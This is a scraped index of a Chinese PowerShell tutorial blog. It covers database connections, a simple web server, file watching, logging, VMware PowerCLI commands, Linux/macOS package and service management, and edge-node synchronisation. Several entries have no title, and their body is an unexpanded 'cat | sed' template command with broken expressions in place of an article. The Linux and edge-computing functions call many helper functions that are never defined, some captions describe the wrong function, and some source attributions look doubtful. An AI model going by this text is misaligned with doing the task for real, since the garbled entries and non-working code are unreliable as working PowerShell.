) try { $connection = $null switch ($DatabaseType) { &quot;SQLite&quot; { $connection = New-Object Microsoft.Data.Sqlite.SqliteConnection($ConnectionString) } &quot;PostgreSQL&quot; { $connection = New-Object Npgsql.NpgsqlConnection($ConnectionString) } &quot;MySQL&quot; { $connection = New-Object MySql.Data.MySqlClient.MySqlConnection($ConnectionString) } &quot;MongoDB&quot; { $connection = New-Object MongoDB.Driver.MongoClient($ConnectionString) } } if ($UseConnectionPooling) { $connection.ConnectionString += &quot;;Pooling=true&quot; } $connection.Open() Write-Host &quot;成功连接到 $DatabaseType 数据库&quot; -ForegroundColor Green return $connection } catch { Write-Error &quot;数据库连接失败：$_&quot; return $null }}function Invoke-CrossPlatformQuery { [CmdletBinding()] param( [Parameter(Mandatory = $true)] $Connection, [Parameter(Mandatory = $true)] [string]$Query, [Parameter()] [hashtable]$Parameters ) try { $command = $Connection.CreateCommand() $command.CommandText = $Query if ($Parameters) { foreach ($param in $Parameters.GetEnumerator()) { $dbParam = $command.CreateParameter() $dbParam.ParameterName = $param.Key $dbParam.Value = $param.Value $command.Parameters.Add($dbParam) } } $result = $command.ExecuteReader() $dataTable = New-Object System.Data.DataTable $dataTable.Load($result) return $dataTable } catch { Write-Error &quot;查询执行失败：$_&quot; return $null }}# 示例：使用SQLite数据库$connection = Connect-CrossPlatformDatabase -DatabaseType &quot;SQLite&quot; ` -ConnectionString &quot;Data Source=test.db&quot; ` -UseConnectionPooling$result = Invoke-CrossPlatformQuery -Connection $connection ` -Query &quot;SELECT * FROM Users WHERE Age &gt; @Age&quot; ` -Parameters @{ &quot;Age&quot; = 18 } 跨平台网络编程使用.NET Core的网络库，我们可以实现跨平台的网络通信： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113function New-CrossPlatformWebServer { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$Url, [Parameter()] [scriptblock]$RequestHandler, [Parameter()] [int]$MaxConnections = 100 ) try { $listener = New-Object System.Net.HttpListener $listener.Prefixes.Add($Url) $listener.Start() Write-Host &quot;Web服务器已启动，监听地址：$Url&quot; -ForegroundColor Green while ($true) { $context = $listener.GetContext() $request = $context.Request $response = $context.Response # 处理请求 if ($RequestHandler) { $RequestHandler.Invoke($request, $response) } else { $response.StatusCode = 200 $response.ContentType = &quot;text/plain&quot; $responseString = &quot;Hello from PowerShell Web Server!&quot; $buffer = [System.Text.Encoding]::UTF8.GetBytes($responseString) $response.ContentLength64 = $buffer.Length $response.OutputStream.Write($buffer, 0, $buffer.Length) } $response.Close() } } catch { Write-Error &quot;Web服务器启动失败：$_&quot; return $null }}function Send-CrossPlatformHttpRequest { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$Url, [Parameter()] [ValidateSet(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;)] [string]$Method = &quot;GET&quot;, [Parameter()] [hashtable]$Headers, [Parameter()] [string]$Body ) try { $client = New-Object System.Net.Http.HttpClient if ($Headers) { foreach ($header in $Headers.GetEnumerator()) { $client.DefaultRequestHeaders.Add($header.Key, $header.Value) } } $request = New-Object System.Net.Http.HttpRequestMessage($Method, $Url) if ($Body) { $request.Content = New-Object System.Net.Http.StringContent($Body) } $response = $client.SendAsync($request).Result $responseContent = $response.Content.ReadAsStringAsync().Result return [PSCustomObject]@{ StatusCode = $response.StatusCode Content = $responseContent Headers = $response.Headers } } catch { Write-Error &quot;HTTP请求失败：$_&quot; return $null }}# 示例：创建Web服务器并发送请求$server = Start-Job -ScriptBlock { New-CrossPlatformWebServer -Url &quot;http://localhost:8080/&quot; ` -RequestHandler { param($request, $response) $responseString = &quot;收到请求：$($request.Url)&quot; $buffer = [System.Text.Encoding]::UTF8.GetBytes($responseString) $response.ContentLength64 = $buffer.Length $response.OutputStream.Write($buffer, 0, $buffer.Length) }}Start-Sleep -Seconds 2$result = Send-CrossPlatformHttpRequest -Url &quot;http://localhost:8080/&quot; ` -Method &quot;GET&quot; ` -Headers @{ &quot;User-Agent&quot; = &quot;PowerShell Client&quot; } 跨平台文件系统监控使用.NET Core的文件系统监控功能，我们可以实现跨平台的文件系统事件监控： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function Start-CrossPlatformFileWatcher { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$Path, [Parameter()] [ValidateSet(&quot;Created&quot;, &quot;Changed&quot;, &quot;Deleted&quot;, &quot;Renamed&quot;, &quot;All&quot;)] [string[]]$Events = @(&quot;All&quot;), [Parameter()] [string]$Filter = &quot;*.*&quot;, [Parameter()] [switch]$IncludeSubdirectories, [Parameter()] [scriptblock]$OnEvent ) try { $watcher = New-Object System.IO.FileSystemWatcher $watcher.Path = $Path $watcher.Filter = $Filter $watcher.IncludeSubdirectories = $IncludeSubdirectories $watcher.EnableRaisingEvents = $true # 注册事件处理程序 if ($Events -contains &quot;All&quot; -or $Events -contains &quot;Created&quot;) { $watcher.Created += { if ($OnEvent) { $OnEvent.Invoke(&quot;Created&quot;, $EventArgs) } } } if ($Events -contains &quot;All&quot; -or $Events -contains &quot;Changed&quot;) { $watcher.Changed += { if ($OnEvent) { $OnEvent.Invoke(&quot;Changed&quot;, $EventArgs) } } } if ($Events -contains &quot;All&quot; -or $Events -contains &quot;Deleted&quot;) { $watcher.Deleted += { if ($OnEvent) { $OnEvent.Invoke(&quot;Deleted&quot;, $EventArgs) } } } if ($Events -contains &quot;All&quot; -or $Events -contains &quot;Renamed&quot;) { $watcher.Renamed += { if ($OnEvent) { $OnEvent.Invoke(&quot;Renamed&quot;, $EventArgs) } } } Write-Host &quot;文件系统监控已启动，监控路径：$Path&quot; -ForegroundColor Green return $watcher } catch { Write-Error &quot;文件系统监控启动失败：$_&quot; return $null }}# 示例：监控文件系统变化$watcher = Start-CrossPlatformFileWatcher -Path &quot;C:\\Temp&quot; ` -Events @(&quot;Created&quot;, &quot;Changed&quot;, &quot;Deleted&quot;) ` -Filter &quot;*.txt&quot; ` -IncludeSubdirectories ` -OnEvent { param($eventType, $eventArgs) Write-Host &quot;检测到文件系统事件：$eventType&quot; -ForegroundColor Yellow Write-Host &quot;文件路径：$($eventArgs.FullPath)&quot; -ForegroundColor Cyan } 跨平台日志管理使用.NET Core的日志框架，我们可以实现跨平台的日志管理： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111function New-CrossPlatformLogger { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$LogPath, [Parameter()] [ValidateSet(&quot;Debug&quot;, &quot;Info&quot;, &quot;Warning&quot;, &quot;Error&quot;, &quot;Critical&quot;)] [string]$LogLevel = &quot;Info&quot;, [Parameter()] [switch]$EnableConsoleOutput, [Parameter()] [switch]$EnableFileOutput, [Parameter()] [switch]$EnableJsonFormat ) try { $logger = [PSCustomObject]@{ LogPath = $LogPath LogLevel = $LogLevel EnableConsoleOutput = $EnableConsoleOutput EnableFileOutput = $EnableFileOutput EnableJsonFormat = $EnableJsonFormat LogLevels = @{ &quot;Debug&quot; = 0 &quot;Info&quot; = 1 &quot;Warning&quot; = 2 &quot;Error&quot; = 3 &quot;Critical&quot; = 4 } } # 创建日志目录 if ($EnableFileOutput) { $logDir = Split-Path -Parent $LogPath if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null } } # 添加日志方法 $logger | Add-Member -MemberType ScriptMethod -Name &quot;Log&quot; -Value { param( [string]$Level, [string]$Message, [hashtable]$Properties ) if ($this.LogLevels[$Level] -ge $this.LogLevels[$this.LogLevel]) { $timestamp = Get-Date -Format &quot;yyyy-MM-dd HH:mm:ss.fff&quot; $logEntry = [PSCustomObject]@{ Timestamp = $timestamp Level = $Level Message = $Message Properties = $Properties } if ($this.EnableJsonFormat) { $logString = $logEntry | ConvertTo-Json } else { $logString = &quot;[$timestamp] [$Level] $Message&quot; if ($Properties) { $logString += &quot; | &quot; + ($Properties.GetEnumerator() | ForEach-Object { &quot;$($_.Key)=$($_.Value)&quot; }) -join &quot; &quot; } } if ($this.EnableConsoleOutput) { switch ($Level) { &quot;Debug&quot; { Write-Debug $logString } &quot;Info&quot; { Write-Host $logString -ForegroundColor White } &quot;Warning&quot; { Write-Host $logString -ForegroundColor Yellow } &quot;Error&quot; { Write-Host $logString -ForegroundColor Red } &quot;Critical&quot; { Write-Host $logString -ForegroundColor DarkRed } } } if ($this.EnableFileOutput) { $logString | Out-File -FilePath $this.LogPath -Append } } } return $logger } catch { Write-Error &quot;创建日志记录器失败：$_&quot; return $null }}# 示例：使用日志记录器$logger = New-CrossPlatformLogger -LogPath &quot;C:\\Logs\\app.log&quot; ` -LogLevel &quot;Info&quot; ` -EnableConsoleOutput ` -EnableFileOutput ` -EnableJsonFormat$logger.Log(&quot;Info&quot;, &quot;应用程序启动&quot;, @{ &quot;Version&quot; = &quot;1.0.0&quot; &quot;Platform&quot; = $PSVersionTable.Platform})$logger.Log(&quot;Warning&quot;, &quot;磁盘空间不足&quot;, @{ &quot;Drive&quot; = &quot;C:&quot; &quot;FreeSpace&quot; = &quot;1.2GB&quot;}) 最佳实践 使用.NET Core的跨平台API而不是平台特定API 实现优雅的错误处理和日志记录 使用连接池和资源管理 实现适当的超时和重试机制 使用异步操作提高性能 实现适当的清理和资源释放 使用配置文件管理设置 实现适当的权限检查","link":"/2024/06/19/powershell-advanced-cross-platform/"},{"title":"PowerShell 技能连载 - PowerCLI：管理VMware的简便方法","text":"简介踏上穿越 VMware 虚拟景观的迷人旅程可能是一项艰巨的任务。别害怕，亲爱的管理员们，PowerCLI 将改变您的 VMware 管理体验。作为多年来在这些虚拟领域中航行过的人，我将引导您了解 PowerShell 的复杂之处。 使用 PowerCLI 入门安装 PowerShell 模块在深入研究 PowerCLI 魔法之前，请确保已安装必要的模块。对于 VMware 管理，您需要安装 VMware PowerCLI 模块。使用以下 PowerShell 命令进行安装： Install-Module -Name VMware.PowerCLI -Force -AllowClobber 来源： PowerShell Gallery (powershellgallery.com) 此命令获取并安装 VMware PowerCLI 模块，这是管理虚拟环境所需的先决条件。 连接到您的 VMware 环境一旦模块被安装，您可以使用以下命令连接到您的 VMware 环境： Connect-VIServer -Server YourVMwareServer -User YourUsername -Password YourPassword 来源： VMware PowerCLI 文档 (code.vmware.com) 用实际服务器详细信息替换 “YourVMwareServer,” “YourUsername,” 和 “YourPassword” 。这将建立与您的 VMware 环境之间的连接。 PowerCLI：虚拟管理的交响乐VM概览的基本命令让我们从微软官方 PowerShell 文档中提取的一个基本命令开始： 1Get-VM 来源： 微软 PowerShell 文档 (docs.microsoft.com) 这个一行代码可以直接从 PowerShell 的圣典中为您提供 VMware 环境中所有虚拟机的全面列表。 使用 Where-Object 进行结果细化有时，您只需要特定信息。PowerShell 可以帮到你！使用 Where-Object 命令来过滤结果。例如，让我们找出具有超过 4 GB RAM 的 VM： Get-VM | Where-Object {$_.MemoryGB -gt 4} 来源： PowerShell.org 社区论坛 (powershell.org) 这段代码可帮助您识别具有超过 4 GB RAM 的 VM，这是从 PowerShell 社区汲取的智慧之源。 快照简化处理管理快照至关重要，而 VMware 官方文档提供了一个珍贵建议： Get-VM &quot;YourVMName&quot; | New-Snapshot -Name &quot;SnapshotName&quot; -Description &quot;SnapshotDescription&quot; 来源： VMware PowerCLI 文档 (code.vmware.com) 在此处，我们创建了一个带名称和描述的快照，遵循了 VMware 最佳实践。 使用 Set-VM 进行动态资源管理调整 VM 资源是一个强大功能，并且来自 VMware 的文档帮助我们掌握这种力量： Set-VM -Name &quot;YourVMName&quot; -MemoryGB 8 -NumCPU 2 来源： VMware PowerCLI 文档 (code.vmware.com) 这个一行代码展示了在 VMware 中使用 PowerShell CLI 实现无缝资源管理能力。 使用 Invoke-VMScript 在 VM 内运行命令要在 VM 内部执行命令，请参考 VMware 知识库: Invoke-VMScript -VM &quot;YourVMName&quot; -ScriptText &quot;YourScript&quot; -GuestCredential (Get-Credential) 此片段使您可以安全地在 VM 中运行脚本或命令。 结论当您开始使用PowerCLI在VMware中进行这段神奇的旅程时，请记住每个命令都是您虚拟魔法书中的一个咒语。本指南取自权威来源，只是您PowerShell冒险之旅的开端。定制、实验，并让魔法流淌在您的虚拟领域中。您的VMware管理即将变得不仅高效，而且真正迷人。祝编写脚本愉快！","link":"/2024/06/20/PowerCLI-The-Easy-Way-To-Manage-VMware/"},{"title":"","text":"$(cat _posts/2024-06-18-powershell-change-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/18/powershell-change-management/"},{"title":"","text":"$(cat _posts/2024-06-21-powershell-gui-development.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了如何创建图形用户界面应用程序。虽然PowerShell主要用作命令行工具，但它可以利用.NET Framework创建全功能的GUI应用程序。这对于需要用户友好界面的管理工具特别有用，可以使非技术用户也能执行复杂的系统管理任务。\\n/}pd}p’)","link":"/2024/06/21/powershell-gui-development/"},{"title":"","text":"$(cat _posts/2024-06-24-powershell-script-modularization.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/24/powershell-script-modularization/"},{"title":"","text":"$(cat _posts/2024-06-28-powershell-pdf-automation.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/06/28/powershell-pdf-automation/"},{"title":"","text":"$(cat _posts/2024-07-01-powershell-azure-functions-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2024/07/01/powershell-azure-functions-management/"},{"title":"","text":"$(cat _posts/2024-07-03-powershell-multi-cloud-cost.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/07/03/powershell-multi-cloud-cost/"},{"title":"PowerShell 技能连载 - Linux&#x2F;macOS 支持","text":"在跨平台时代，PowerShell已经不再局限于Windows环境。本文将介绍如何使用PowerShell在Linux和macOS环境中进行系统管理和自动化操作，包括包管理、服务控制和日志分析等功能。 包管理首先，让我们创建一个用于管理Linux/macOS软件包的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function Manage-CrossPlatformPackages { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$PackageID, [Parameter()] [string[]]$PackageTypes, [Parameter()] [ValidateSet(&quot;Install&quot;, &quot;Update&quot;, &quot;Remove&quot;)] [string]$OperationMode = &quot;Install&quot;, [Parameter()] [hashtable]$PackageConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ PackageID = $PackageID StartTime = Get-Date PackageStatus = @{} Operations = @{} Issues = @() } # 获取包管理器类型 $packageManager = Get-PackageManagerType # 管理软件包 foreach ($type in $PackageTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用包配置 $typeConfig = Apply-PackageConfig ` -Config $PackageConfig ` -Type $type ` -Mode $OperationMode ` -PackageManager $packageManager $status.Config = $typeConfig # 执行包操作 $operations = Execute-PackageOperations ` -Type $type ` -Config $typeConfig ` -PackageManager $packageManager $status.Operations = $operations $manager.Operations[$type] = $operations # 检查包问题 $issues = Check-PackageIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新包状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.PackageStatus[$type] = $status } # 记录包日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;跨平台包管理失败：$_&quot; return $null }} 服务控制接下来，创建一个用于管理Linux/macOS服务的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798function Manage-CrossPlatformServices { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ServiceID, [Parameter()] [string[]]$ServiceTypes, [Parameter()] [ValidateSet(&quot;Start&quot;, &quot;Stop&quot;, &quot;Restart&quot;)] [string]$OperationMode = &quot;Start&quot;, [Parameter()] [hashtable]$ServiceConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ ServiceID = $ServiceID StartTime = Get-Date ServiceStatus = @{} Operations = @{} Issues = @() } # 获取服务管理器类型 $serviceManager = Get-ServiceManagerType # 管理服务 foreach ($type in $ServiceTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用服务配置 $typeConfig = Apply-ServiceConfig ` -Config $ServiceConfig ` -Type $type ` -Mode $OperationMode ` -ServiceManager $serviceManager $status.Config = $typeConfig # 执行服务操作 $operations = Execute-ServiceOperations ` -Type $type ` -Config $typeConfig ` -ServiceManager $serviceManager $status.Operations = $operations $manager.Operations[$type] = $operations # 检查服务问题 $issues = Check-ServiceIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新服务状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.ServiceStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-ServiceReport ` -Manager $manager ` -Config $ServiceConfig $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;跨平台服务管理失败：$_&quot; return $null }} 上面的代码定义了一个名为 Manage-CrossPlatformPackages 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 日志分析最后，创建一个用于管理日志分析的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798function Analyze-CrossPlatformLogs { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$LogID, [Parameter()] [string[]]$LogTypes, [Parameter()] [ValidateSet(&quot;System&quot;, &quot;Application&quot;, &quot;Security&quot;)] [string]$LogMode = &quot;System&quot;, [Parameter()] [hashtable]$LogConfig, [Parameter()] [string]$ReportPath ) try { $analyzer = [PSCustomObject]@{ LogID = $LogID StartTime = Get-Date LogStatus = @{} Analysis = @{} Issues = @() } # 获取日志管理器类型 $logManager = Get-LogManagerType # 分析日志 foreach ($type in $LogTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Analysis = @{} Issues = @() } # 应用日志配置 $typeConfig = Apply-LogConfig ` -Config $LogConfig ` -Type $type ` -Mode $LogMode ` -LogManager $logManager $status.Config = $typeConfig # 执行日志分析 $analysis = Execute-LogAnalysis ` -Type $type ` -Config $typeConfig ` -LogManager $logManager $status.Analysis = $analysis $analyzer.Analysis[$type] = $analysis # 检查日志问题 $issues = Check-LogIssues ` -Analysis $analysis ` -Config $typeConfig $status.Issues = $issues $analyzer.Issues += $issues # 更新日志状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $analyzer.LogStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-LogReport ` -Analyzer $analyzer ` -Config $LogConfig $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新分析器状态 $analyzer.EndTime = Get-Date return $analyzer } catch { Write-Error &quot;跨平台日志分析失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理Linux/macOS环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# 管理软件包$manager = Manage-CrossPlatformPackages -PackageID &quot;PACKAGE001&quot; ` -PackageTypes @(&quot;Web&quot;, &quot;Database&quot;, &quot;Monitoring&quot;) ` -OperationMode &quot;Install&quot; ` -PackageConfig @{ &quot;Web&quot; = @{ &quot;Name&quot; = &quot;nginx&quot; &quot;Version&quot; = &quot;latest&quot; &quot;Dependencies&quot; = @(&quot;openssl&quot;, &quot;pcre&quot;) &quot;Options&quot; = @{ &quot;WithSSL&quot; = $true &quot;WithHTTP2&quot; = $true } } &quot;Database&quot; = @{ &quot;Name&quot; = &quot;postgresql&quot; &quot;Version&quot; = &quot;14&quot; &quot;Dependencies&quot; = @(&quot;openssl&quot;, &quot;readline&quot;) &quot;Options&quot; = @{ &quot;WithSSL&quot; = $true &quot;WithJSON&quot; = $true } } &quot;Monitoring&quot; = @{ &quot;Name&quot; = &quot;prometheus&quot; &quot;Version&quot; = &quot;latest&quot; &quot;Dependencies&quot; = @(&quot;go&quot;, &quot;nodejs&quot;) &quot;Options&quot; = @{ &quot;WithNodeExporter&quot; = $true &quot;WithAlertManager&quot; = $true } } } ` -LogPath &quot;C:\\Logs\\package_management.json&quot;# 管理服务$manager = Manage-CrossPlatformServices -ServiceID &quot;SERVICE001&quot; ` -ServiceTypes @(&quot;Web&quot;, &quot;Database&quot;, &quot;Monitoring&quot;) ` -OperationMode &quot;Start&quot; ` -ServiceConfig @{ &quot;Web&quot; = @{ &quot;Name&quot; = &quot;nginx&quot; &quot;User&quot; = &quot;www-data&quot; &quot;Group&quot; = &quot;www-data&quot; &quot;Options&quot; = @{ &quot;AutoStart&quot; = $true &quot;EnableSSL&quot; = $true } } &quot;Database&quot; = @{ &quot;Name&quot; = &quot;postgresql&quot; &quot;User&quot; = &quot;postgres&quot; &quot;Group&quot; = &quot;postgres&quot; &quot;Options&quot; = @{ &quot;AutoStart&quot; = $true &quot;EnableSSL&quot; = $true } } &quot;Monitoring&quot; = @{ &quot;Name&quot; = &quot;prometheus&quot; &quot;User&quot; = &quot;prometheus&quot; &quot;Group&quot; = &quot;prometheus&quot; &quot;Options&quot; = @{ &quot;AutoStart&quot; = $true &quot;EnableNodeExporter&quot; = $true } } } ` -ReportPath &quot;C:\\Reports\\service_management.json&quot;# 分析日志$analyzer = Analyze-CrossPlatformLogs -LogID &quot;LOG001&quot; ` -LogTypes @(&quot;System&quot;, &quot;Application&quot;, &quot;Security&quot;) ` -LogMode &quot;System&quot; ` -LogConfig @{ &quot;System&quot; = @{ &quot;Sources&quot; = @(&quot;/var/log/syslog&quot;, &quot;/var/log/messages&quot;) &quot;Filters&quot; = @{ &quot;Level&quot; = @(&quot;ERROR&quot;, &quot;WARNING&quot;) &quot;TimeRange&quot; = &quot;24h&quot; } &quot;Analysis&quot; = @{ &quot;Patterns&quot; = $true &quot;Anomalies&quot; = $true } } &quot;Application&quot; = @{ &quot;Sources&quot; = @(&quot;/var/log/nginx/error.log&quot;, &quot;/var/log/postgresql/postgresql-*.log&quot;) &quot;Filters&quot; = @{ &quot;Level&quot; = @(&quot;ERROR&quot;, &quot;WARNING&quot;) &quot;TimeRange&quot; = &quot;24h&quot; } &quot;Analysis&quot; = @{ &quot;Patterns&quot; = $true &quot;Anomalies&quot; = $true } } &quot;Security&quot; = @{ &quot;Sources&quot; = @(&quot;/var/log/auth.log&quot;, &quot;/var/log/secure&quot;) &quot;Filters&quot; = @{ &quot;Level&quot; = @(&quot;ERROR&quot;, &quot;WARNING&quot;) &quot;TimeRange&quot; = &quot;24h&quot; } &quot;Analysis&quot; = @{ &quot;Patterns&quot; = $true &quot;Anomalies&quot; = $true } } } ` -ReportPath &quot;C:\\Reports\\log_analysis.json&quot; 最佳实践 实施包管理 配置服务控制 分析日志数据 保持详细的部署记录 定期进行健康检查 实施监控策略 建立告警机制 保持系统文档更新","link":"/2024/07/05/powershell-linux-macos-support/"},{"title":"PowerShell 技能连载 - 边缘计算环境管理","text":"在边缘计算领域，环境管理对于确保分布式系统的稳定运行至关重要。本文将介绍如何使用PowerShell构建一个边缘计算环境管理系统，包括边缘节点管理、数据同步、资源调度等功能。 边缘节点管理首先，让我们创建一个用于管理边缘节点的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596function Manage-EdgeNode { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$NodeID, [Parameter()] [ValidateSet(&quot;Gateway&quot;, &quot;Sensor&quot;, &quot;Controller&quot;, &quot;Storage&quot;)] [string]$Type = &quot;Gateway&quot;, [Parameter()] [int]$MaxConnections = 100, [Parameter()] [int]$MaxStorageGB = 100, [Parameter()] [switch]$AutoScale ) try { $node = [PSCustomObject]@{ NodeID = $NodeID Type = $Type MaxConnections = $MaxConnections MaxStorageGB = $MaxStorageGB StartTime = Get-Date Status = &quot;Initializing&quot; Resources = @{} Connections = @() Storage = @{} } # 初始化节点 $initResult = Initialize-EdgeNode -Type $Type ` -MaxConnections $MaxConnections ` -MaxStorageGB $MaxStorageGB if (-not $initResult.Success) { throw &quot;节点初始化失败：$($initResult.Message)&quot; } # 配置资源 $node.Resources = [PSCustomObject]@{ CPUUsage = 0 MemoryUsage = 0 NetworkUsage = 0 StorageUsage = 0 Temperature = 0 } # 加载连接 $connections = Get-NodeConnections -NodeID $NodeID foreach ($conn in $connections) { $node.Connections += [PSCustomObject]@{ ConnectionID = $conn.ID Type = $conn.Type Status = $conn.Status Bandwidth = $conn.Bandwidth Latency = $conn.Latency LastSync = $conn.LastSync } } # 配置存储 $node.Storage = [PSCustomObject]@{ Total = $MaxStorageGB Used = 0 Available = $MaxStorageGB Files = @() SyncStatus = &quot;Idle&quot; } # 自动扩展 if ($AutoScale) { $scaleConfig = Get-NodeScaleConfig -NodeID $NodeID $node.ScaleConfig = $scaleConfig # 监控资源使用 $monitor = Start-Job -ScriptBlock { param($nodeID, $config) Monitor-NodeResources -NodeID $nodeID -Config $config } -ArgumentList $NodeID, $scaleConfig } # 更新状态 $node.Status = &quot;Running&quot; $node.EndTime = Get-Date return $node } catch { Write-Error &quot;边缘节点管理失败：$_&quot; return $null }} 数据同步接下来，创建一个用于管理边缘节点数据同步的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109function Sync-EdgeData { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$SourceNodeID, [Parameter(Mandatory = $true)] [string]$TargetNodeID, [Parameter()] [string[]]$DataTypes, [Parameter()] [ValidateSet(&quot;RealTime&quot;, &quot;Scheduled&quot;, &quot;OnDemand&quot;)] [string]$SyncMode = &quot;Scheduled&quot;, [Parameter()] [int]$Interval = 300, [Parameter()] [hashtable]$Filters ) try { $sync = [PSCustomObject]@{ SourceNodeID = $SourceNodeID TargetNodeID = $TargetNodeID StartTime = Get-Date Mode = $SyncMode Status = &quot;Initializing&quot; DataTypes = $DataTypes Statistics = @{} Errors = @() } # 验证节点 $sourceNode = Get-EdgeNode -NodeID $SourceNodeID $targetNode = Get-EdgeNode -NodeID $TargetNodeID if (-not $sourceNode -or -not $targetNode) { throw &quot;源节点或目标节点不存在&quot; } # 配置同步 $syncConfig = [PSCustomObject]@{ Mode = $SyncMode Interval = $Interval Filters = $Filters Compression = $true Encryption = $true } # 初始化同步 $initResult = Initialize-DataSync ` -SourceNode $sourceNode ` -TargetNode $targetNode ` -Config $syncConfig if (-not $initResult.Success) { throw &quot;同步初始化失败：$($initResult.Message)&quot; } # 开始同步 switch ($SyncMode) { &quot;RealTime&quot; { $syncJob = Start-Job -ScriptBlock { param($sourceID, $targetID, $config) Sync-RealTimeData -SourceID $sourceID -TargetID $targetID -Config $config } -ArgumentList $SourceNodeID, $TargetNodeID, $syncConfig } &quot;Scheduled&quot; { $syncJob = Start-Job -ScriptBlock { param($sourceID, $targetID, $config) Sync-ScheduledData -SourceID $sourceID -TargetID $targetID -Config $config } -ArgumentList $SourceNodeID, $TargetNodeID, $syncConfig } &quot;OnDemand&quot; { $syncJob = Start-Job -ScriptBlock { param($sourceID, $targetID, $config) Sync-OnDemandData -SourceID $sourceID -TargetID $targetID -Config $config } -ArgumentList $SourceNodeID, $TargetNodeID, $syncConfig } } # 监控同步状态 while ($syncJob.State -eq &quot;Running&quot;) { $status = Get-SyncStatus -JobID $syncJob.Id $sync.Status = $status.State $sync.Statistics = $status.Statistics if ($status.Errors.Count -gt 0) { $sync.Errors += $status.Errors } Start-Sleep -Seconds 5 } # 更新同步状态 $sync.EndTime = Get-Date return $sync } catch { Write-Error &quot;数据同步失败：$_&quot; return $null }} 